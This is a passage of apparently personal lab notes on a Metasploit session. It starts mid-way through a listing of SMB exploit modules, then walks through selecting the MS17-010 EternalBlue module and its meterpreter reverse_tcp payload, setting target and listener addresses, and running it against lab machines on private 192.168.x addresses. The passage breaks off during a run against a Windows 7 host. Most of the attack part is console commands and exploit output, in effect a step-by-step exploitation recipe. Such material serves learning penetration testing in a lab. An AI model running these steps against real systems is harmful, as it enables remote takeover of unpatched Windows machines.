   72     \_ target: Windows 2000 Server SP0-SP4+ Simplified Chinese                    .                .          .      .
   73     \_ target: Windows 2000 Server SP0-SP4+ Spanish                               .                .          .      .
   74     \_ target: Windows 2000 Server SP0-SP4+ Swedish                               .                .          .      .
   75     \_ target: Windows 2000 Server SP0-SP4+ Traditional Chinese                   .                .          .      .
   76     \_ target: Windows 2000 Server SP0-SP4+ Turkish                               .                .          .      .
   77     \_ target: Windows 2003 Server SP0 English                                    .                .          .      .
   78     \_ target: Windows 2003 Server SP0 French                                     .                .          .      .
   79     \_ target: Windows 2003 Server SP1-SP2 English                                .                .          .      .
   80     \_ target: Windows 2003 Server SP1-SP2 French                                 .                .          .      .
   81     \_ target: Windows 2003 Server SP1-SP2 Spanish                                .                .          .      .
   82     \_ target: Windows 2003 Server SP1-SP2 Italian                                .                .          .      .
   83     \_ target: Windows 2003 Server SP1-SP2 German                                 .                .          .      .
   84     \_ target: Windows 2003 Server SP1-SP2 Russian                                .                .          .      .
   85     \_ target: Windows 2003 Server SP1-SP2 Simplified Chinese                     .                .          .      .
   86   exploit/windows/smb/ms08_067_netapi                                             2008-10-28       great      Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
   87     \_ target: Automatic Targeting                                                .                .          .      .
   88     \_ target: Windows 2000 Universal                                             .                .          .      .
   89     \_ target: Windows XP SP0/SP1 Universal                                       .                .          .      .
   90     \_ target: Windows 2003 SP0 Universal                                         .                .          .      .
   91     \_ target: Windows XP SP2 English (AlwaysOn NX)                               .                .          .      .
   92     \_ target: Windows XP SP2 English (NX)                                        .                .          .      .
   93     \_ target: Windows XP SP3 English (AlwaysOn NX)                               .                .          .      .
   94     \_ target: Windows XP SP3 English (NX)                                        .                .          .      .
   95     \_ target: Windows XP SP2 Arabic (NX)                                         .                .          .      .
   96     \_ target: Windows XP SP2 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
   97     \_ target: Windows XP SP2 Chinese - Simplified (NX)                           .                .          .      .
   98     \_ target: Windows XP SP2 Chinese - Traditional (NX)                          .                .          .      .
   99     \_ target: Windows XP SP2 Czech (NX)                                          .                .          .      .
   100    \_ target: Windows XP SP2 Danish (NX)                                         .                .          .      .
   101    \_ target: Windows XP SP2 German (NX)                                         .                .          .      .
   102    \_ target: Windows XP SP2 Greek (NX)                                          .                .          .      .
   103    \_ target: Windows XP SP2 Spanish (NX)                                        .                .          .      .
   104    \_ target: Windows XP SP2 Finnish (NX)                                        .                .          .      .
   105    \_ target: Windows XP SP2 French (NX)                                         .                .          .      .
   106    \_ target: Windows XP SP2 Hebrew (NX)                                         .                .          .      .
   107    \_ target: Windows XP SP2 Hungarian (NX)                                      .                .          .      .
   108    \_ target: Windows XP SP2 Italian (NX)                                        .                .          .      .
   109    \_ target: Windows XP SP2 Japanese (NX)                                       .                .          .      .
   110    \_ target: Windows XP SP2 Korean (NX)                                         .                .          .      .
   111    \_ target: Windows XP SP2 Dutch (NX)                                          .                .          .      .
   112    \_ target: Windows XP SP2 Norwegian (NX)                                      .                .          .      .
   113    \_ target: Windows XP SP2 Polish (NX)                                         .                .          .      .
   114    \_ target: Windows XP SP2 Portuguese - Brazilian (NX)                         .                .          .      .
   115    \_ target: Windows XP SP2 Portuguese (NX)                                     .                .          .      .
   116    \_ target: Windows XP SP2 Russian (NX)                                        .                .          .      .
   117    \_ target: Windows XP SP2 Swedish (NX)                                        .                .          .      .
   118    \_ target: Windows XP SP2 Turkish (NX)                                        .                .          .      .
   119    \_ target: Windows XP SP3 Arabic (NX)                                         .                .          .      .
   120    \_ target: Windows XP SP3 Chinese - Traditional / Taiwan (NX)                 .                .          .      .
   121    \_ target: Windows XP SP3 Chinese - Simplified (NX)                           .                .          .      .
   122    \_ target: Windows XP SP3 Chinese - Traditional (NX)                          .                .          .      .
   123    \_ target: Windows XP SP3 Czech (NX)                                          .                .          .      .
   124    \_ target: Windows XP SP3 Danish (NX)                                         .                .          .      .
   125    \_ target: Windows XP SP3 German (NX)                                         .                .          .      .
   126    \_ target: Windows XP SP3 Greek (NX)                                          .                .          .      .
   127    \_ target: Windows XP SP3 Spanish (NX)                                        .                .          .      .
   128    \_ target: Windows XP SP3 Finnish (NX)                                        .                .          .      .
   129    \_ target: Windows XP SP3 French (NX)                                         .                .          .      .
   130    \_ target: Windows XP SP3 Hebrew (NX)                                         .                .          .      .
   131    \_ target: Windows XP SP3 Hungarian (NX)                                      .                .          .      .
   132    \_ target: Windows XP SP3 Italian (NX)                                        .                .          .      .
   133    \_ target: Windows XP SP3 Japanese (NX)                                       .                .          .      .
   134    \_ target: Windows XP SP3 Korean (NX)                                         .                .          .      .
   135    \_ target: Windows XP SP3 Dutch (NX)                                          .                .          .      .
   136    \_ target: Windows XP SP3 Norwegian (NX)                                      .                .          .      .
   137    \_ target: Windows XP SP3 Polish (NX)                                         .                .          .      .
   138    \_ target: Windows XP SP3 Portuguese - Brazilian (NX)                         .                .          .      .
   139    \_ target: Windows XP SP3 Portuguese (NX)                                     .                .          .      .
   140    \_ target: Windows XP SP3 Russian (NX)                                        .                .          .      .
   141    \_ target: Windows XP SP3 Swedish (NX)                                        .                .          .      .
   142    \_ target: Windows XP SP3 Turkish (NX)                                        .                .          .      .
   143    \_ target: Windows 2003 SP1 English (NO NX)                                   .                .          .      .
   144    \_ target: Windows 2003 SP1 English (NX)                                      .                .          .      .
   145    \_ target: Windows 2003 SP1 Japanese (NO NX)                                  .                .          .      .
   146    \_ target: Windows 2003 SP1 Spanish (NO NX)                                   .                .          .      .
   147    \_ target: Windows 2003 SP1 Spanish (NX)                                      .                .          .      .
   148    \_ target: Windows 2003 SP1 French (NO NX)                                    .                .          .      .
   149    \_ target: Windows 2003 SP1 French (NX)                                       .                .          .      .
   150    \_ target: Windows 2003 SP2 English (NO NX)                                   .                .          .      .
   151    \_ target: Windows 2003 SP2 English (NX)                                      .                .          .      .
   152    \_ target: Windows 2003 SP2 German (NO NX)                                    .                .          .      .
   153    \_ target: Windows 2003 SP2 German (NX)                                       .                .          .      .
   154    \_ target: Windows 2003 SP2 Portuguese (NX)                                   .                .          .      .
   155    \_ target: Windows 2003 SP2 Portuguese - Brazilian (NX)                       .                .          .      .
   156    \_ target: Windows 2003 SP2 Spanish (NO NX)                                   .                .          .      .
   157    \_ target: Windows 2003 SP2 Spanish (NX)                                      .                .          .      .
   158    \_ target: Windows 2003 SP2 Japanese (NO NX)                                  .                .          .      .
   159    \_ target: Windows 2003 SP2 French (NO NX)                                    .                .          .      .
   160    \_ target: Windows 2003 SP2 French (NX)                                       .                .          .      .
   161    \_ target: Windows 2003 SP2 Chinese - Simplified (NX)                         .                .          .      .
   162    \_ target: Windows 2003 SP2 Czech (NX)                                        .                .          .      .
   163    \_ target: Windows 2003 SP2 Dutch (NX)                                        .                .          .      .
   164    \_ target: Windows 2003 SP2 Hungarian (NX)                                    .                .          .      .
   165    \_ target: Windows 2003 SP2 Italian (NX)                                      .                .          .      .
   166    \_ target: Windows 2003 SP2 Russian (NX)                                      .                .          .      .
   167    \_ target: Windows 2003 SP2 Swedish (NX)                                      .                .          .      .
   168    \_ target: Windows 2003 SP2 Turkish (NX)                                      .                .          .      .
   169  exploit/windows/smb/smb_relay                                                   2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution
   170    \_ action: CREATE_SMB_SESSION                                                 .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   171    \_ action: PSEXEC                                                             .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   172    \_ target: Automatic                                                          .                .          .      .
   173    \_ target: PowerShell                                                         .                .          .      .
   174    \_ target: Native upload                                                      .                .          .      .
   175    \_ target: MOF upload                                                         .                .          .      .
   176    \_ target: Command                                                            .                .          .      .
   177  exploit/windows/smb/ms09_050_smb2_negotiate_func_index                          2009-09-07       good       No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   178  exploit/windows/browser/ms10_022_ie_vbscript_winhlp32                           2010-02-26       great      No     MS10-022 Microsoft Internet Explorer Winhlp32.exe MsgBox Code Execution
   179    \_ target: Automatic                                                          .                .          .      .
   180    \_ target: Internet Explorer on Windows                                       .                .          .      .
   181  exploit/windows/smb/ms10_061_spoolss                                            2010-09-14       excellent  No     MS10-061 Microsoft Print Spooler Service Impersonation Vulnerability
   182  exploit/windows/fileformat/ms13_071_theme                                       2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   183  exploit/windows/fileformat/ms14_060_sandworm                                    2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   184  exploit/windows/smb/ms17_010_eternalblue                                        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   185    \_ target: Automatic Target                                                   .                .          .      .
   186    \_ target: Windows 7                                                          .                .          .      .
   187    \_ target: Windows Embedded Standard 7                                        .                .          .      .
   188    \_ target: Windows Server 2008 R2                                             .                .          .      .
   189    \_ target: Windows 8                                                          .                .          .      .
   190    \_ target: Windows 8.1                                                        .                .          .      .
   191    \_ target: Windows Server 2012                                                .                .          .      .
   192    \_ target: Windows 10 Pro                                                     .                .          .      .
   193    \_ target: Windows 10 Enterprise Evaluation                                   .                .          .      .
   194  exploit/windows/smb/ms17_010_psexec                                             2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   195    \_ target: Automatic                                                          .                .          .      .
   196    \_ target: PowerShell                                                         .                .          .      .
   197    \_ target: Native upload                                                      .                .          .      .
   198    \_ target: MOF upload                                                         .                .          .      .
   199    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
   200    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
   201    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
   202    \_ AKA: ETERNALBLUE                                                           .                .          .      .
   203  auxiliary/admin/smb/ms17_010_command                                            2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   204    \_ AKA: ETERNALSYNERGY                                                        .                .          .      .
   205    \_ AKA: ETERNALROMANCE                                                        .                .          .      .
   206    \_ AKA: ETERNALCHAMPION                                                       .                .          .      .
   207    \_ AKA: ETERNALBLUE                                                           .                .          .      .
   208  auxiliary/dos/windows/smb/ms05_047_pnp                                          .                normal     No     Microsoft Plug and Play Service Registry Overflow
   209  auxiliary/dos/windows/smb/ms06_063_trans                                        .                normal     No     Microsoft SRV.SYS Pipe Transaction No Null
   210  auxiliary/dos/windows/smb/ms09_001_write                                        .                normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
   211  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                       .                normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   212  auxiliary/dos/windows/smb/vista_negotiate_stop                                  .                normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
   213  auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                      .                normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   214  exploit/windows/smb/psexec                                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   215    \_ target: Automatic                                                          .                .          .      .
   216    \_ target: PowerShell                                                         .                .          .      .
   217    \_ target: Native upload                                                      .                .          .      .
   218    \_ target: MOF upload                                                         .                .          .      .
   219    \_ target: Command                                                            .                .          .      .
   220  auxiliary/dos/windows/smb/ms11_019_electbowser                                  .                normal     No     Microsoft Windows Browser Pool DoS
   221  exploit/windows/smb/smb_rras_erraticgopher                                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
   222    \_ target: Automatic                                                          .                .          .      .
   223    \_ target: Windows Server 2003 SP0 (English)                                  .                .          .      .
   224    \_ target: Windows Server 2003 SP1 (English) (NX)                             .                .          .      .
   225    \_ target: Windows Server 2003 SP2 (English) (NX)                             .                .          .      .
   226    \_ target: Windows Server 2003 R2 SP2 (English) (NX)                          .                .          .      .
   227  exploit/windows/smb/smb_shadow                                                  2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
   228  auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                        .                normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
   229  exploit/windows/smb/ms10_046_shortcut_icon_dllloader                            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
   230  exploit/windows/smb/ms15_020_shortcut_icon_dllloader                            2015-03-10       excellent  No     Microsoft Windows Shell LNK Code Execution
   231  exploit/windows/smb/netidentity_xtierrpcpipe                                    2009-04-06       great      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
   232  exploit/netware/smb/lsass_cifs                                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
   233    \_ target: Automatic                                                          .                .          .      .
   234    \_ target: VMware                                                             .                .          .      .
   235    \_ target: NetWare 6.5 SP2                                                    .                .          .      .
   236    \_ target: NetWare 6.5 SP3                                                    .                .          .      .
   237    \_ target: NetWare 6.5 SP4                                                    .                .          .      .
   238    \_ target: NetWare 6.5 SP5                                                    .                .          .      .
   239    \_ target: NetWare 6.5 SP6                                                    .                .          .      .
   240    \_ target: NetWare 6.5 SP7                                                    .                .          .      .
   241  exploit/windows/oracle/extjob                                                   2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
   242  auxiliary/scanner/sap/sap_smb_relay                                             .                normal     No     SAP SMB Relay Abuse
   243  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                 .                normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   244  exploit/windows/smb/smb_doublepulsar_rce                                        2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   245    \_ target: Execute payload (x64)                                              .                .          .      .
   246    \_ target: Neutralize implant                                                 .                .          .      .
   247  exploit/windows/smb/smb_delivery                                                2016-07-26       excellent  No     SMB Delivery
   248    \_ target: DLL                                                                .                .          .      .
   249    \_ target: PSH                                                                .                .          .      .
   250  auxiliary/scanner/smb/smb_enum_gpp                                              .                normal     No     SMB Group Policy Preference Saved Passwords Enumeration
   251  exploit/windows/local/cve_2020_0796_smbghost                                    2020-03-13       good       Yes    SMBv3 Compression Buffer Overflow
   252    \_ AKA: SMBGhost                                                              .                .          .      .
   253    \_ AKA: CoronaBlue                                                            .                .          .      .
   254  exploit/windows/smb/cve_2020_0796_smbghost                                      2020-03-13       average    Yes    SMBv3 Compression Buffer Overflow
   255    \_ AKA: SMBGhost                                                              .                .          .      .
   256    \_ AKA: CoronaBlue                                                            .                .          .      .
   257  auxiliary/admin/smb/samba_symlink_traversal                                     .                normal     No     Samba Symlink Directory Traversal
   258  exploit/linux/samba/chain_reply                                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
   259    \_ target: Linux (Debian5 3.2.5-4lenny6)                                      .                .          .      .
   260    \_ target: Debugging Target                                                   .                .          .      .
   261  exploit/multi/ids/snort_dce_rpc                                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   262    \_ target: Windows Universal                                                  .                .          .      .
   263    \_ target: Redhat 8                                                           .                .          .      .
   264  exploit/windows/browser/java_ws_double_quote                                    2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   265    \_ target: Automatic                                                          .                .          .      .
   266    \_ target: Java Runtime 1.6.31 to 1.6.35 and 1.7.03 to 1.7.07 on Windows x86  .                .          .      .
   267  exploit/windows/browser/java_ws_arginject_altjvm                                2010-04-09       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   268    \_ target: Automatic                                                          .                .          .      .
   269    \_ target: Java Runtime on Windows x86                                        .                .          .      .
   270  exploit/windows/browser/java_ws_vmargs                                          2012-02-14       excellent  No     Sun Java Web Start Plugin Command Line Argument Injection
   271    \_ target: Automatic                                                          .                .          .      .
   272    \_ target: Java Runtime on Windows x86                                        .                .          .      .
   273  auxiliary/server/teamviewer_uri_smb_redirect                                    .                normal     No     TeamViewer Unquoted URI Handler SMB Redirect
   274  exploit/windows/fileformat/theme_dll_hijack_cve_2023_38146                      2023-09-13       excellent  No     Themebleed- Windows 11 Themes Arbitrary Code Execution CVE-2023-38146
   275  exploit/windows/smb/timbuktu_plughntcommand_bof                                 2009-06-25       great      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   276  exploit/windows/fileformat/ursoft_w32dasm                                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
   277  exploit/windows/fileformat/vlc_smb_uri                                          2009-06-24       great      No     VideoLAN Client (VLC) Win32 smb:// URI Buffer Overflow
   278  auxiliary/admin/smb/webexec_command                                             .                normal     No     WebEx Remote Command Execution Utility
   279  exploit/windows/smb/webexec                                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
   280    \_ target: Automatic                                                          .                .          .      .
   281    \_ target: Native upload                                                      .                .          .      .
   282  post/windows/gather/credentials/gpp                                             .                normal     No     Windows Gather Group Policy Preference Saved Passwords
   283  payload/windows/peinject/reverse_named_pipe                                     .                normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
   284  payload/windows/x64/peinject/reverse_named_pipe                                 .                normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (SMB) Stager
   285  post/windows/gather/netlm_downgrade                                             .                normal     No     Windows NetLM Downgrade Attack
   286  exploit/multi/http/pgadmin_session_deserialization                              2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE


Interact with a module by name or index. For example info 286, use 286 or use exploit/multi/http/pgadmin_session_deserialization

msf6 auxiliary(scanner/smb/smb_ms17_010) > 

===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
 here we select exploit 184 no.  
184  exploit/windows/smb/ms17_010_eternalblue                                        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
 we select it and use - 
===========================================================================================================================
===========================================================================================================================
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
----------------------------------------------------------------------------------------------------------------------------
==========================================================================
meaning of -  What is Meterpreter Reverse_tcp?
Meterpreter uses a reverse_tcp shell, which means it connects to a listener on the attacker’s machine. 
There are two popular types of shells: bind and reverse. A bind shell opens up a new service on the target machine, 
and requires the attacker to connect to it in order to start a session. A reverse shell (also known as a connect-back) 
requires the attacker to first set up a listener to which the target machine can connect.
----------------------------------------------------------------------------------------------------------------------------
https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/#:~:text=Meterpreter%20uses%20a%20reverse_tcp%20shell,order%20to%20start%20a%20session.
----------------------------------------------------------------------------------------------------------------------------
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
in RHOSTS - Target System's ip not set (for chacking we uses show options) ---> show options

---------------------------------------------------------------------------------------------------------------------------

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.44.157   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
In RHOSTS - Target System's ip not set (for set ip in RHOSTS-  we uses set RHOSTS 192.168.44.160) ---> set RHOSTS 192.168.44.160

-----------------------------------------------------------------------------------------------------------------------------

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.44.160
RHOSTS => 192.168.44.160

-----------------------------------------------------------------------------------------------------------------------------

===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
in RHOSTS - Target System's ip not set (for chacking we uses show options) ---> show options
---------------------------------------------------------------------------------------------------------------------------
find below line in show options output--------------------(it means now in RHOSTS - Target System's ip got set )
   RHOSTS         192.168.44.160   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html

---------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------------------------
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.44.160   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.44.157   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.44.157:4444 
[*] 192.168.44.160:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.44.160:445    - Host is likely VULNERABLE to MS17-010! - Windows XP 3790 Service Pack 1 x86 (32-bit)
[*] 192.168.44.160:445    - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.44.160:445 - The target is vulnerable.
[-] 192.168.44.160:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
[*] Exploit completed, but no session was created.

===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
sf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
                                                                                                                    
[*] Started reverse TCP handler on 192.168.44.157:4444                                                              
[*] 192.168.44.160:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check                                          
[+] 192.168.44.160:445    - Host is likely VULNERABLE to MS17-010! - Windows XP 3790 Service Pack 1 x86 (32-bit)    
[*] 192.168.44.160:445    - Scanned 1 of 1 hosts (100% complete)                                                    
[+] 192.168.44.160:445 - The target is vulnerable.                                                                  
[-] 192.168.44.160:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets  
[*] Exploit completed, but no session was created.                                                                  
msf6 exploit(windows/smb/ms17_010_eternalblue) > back                                                               
msf6 > 
--------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------

https://www.securityandit.com/security/how-to-exploit-ms17-010-vulnerability/
https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/#Setup-Used-for-Practicing-Metasploit-Basics
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================

kali attacker os ------gaining access of ------ target win 7 os      - 
metadploit's initiation cmds.... 
----------------------------------------
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.176.130
RHOST => 192.168.176.130
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[-] 192.168.176.130:445   - Rex::HostUnreachable: The host (192.168.176.130:445) was unreachable.
[*] 192.168.176.130:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.176.130                                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.176.134
RHOST => 192.168.176.134
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       192.168.176.134                                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit

[+] 192.168.176.134:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic E 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.176.134:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.176.132:4444 
[*] 192.168.176.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 192.168.176.130:445   - Rex::HostUnreachable: The host (192.168.176.130:445) was unreachable.
[*] 192.168.176.130:445   - Scanned 1 of 1 hosts (100% complete)
[-] 192.168.176.130:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.176.134
RHOST => 192.168.176.134
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.176.132:4444 
[*] 192.168.176.134:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.176.134:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic E 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.176.134:445   - Scanned 1 of 1 hosts (100% complete)
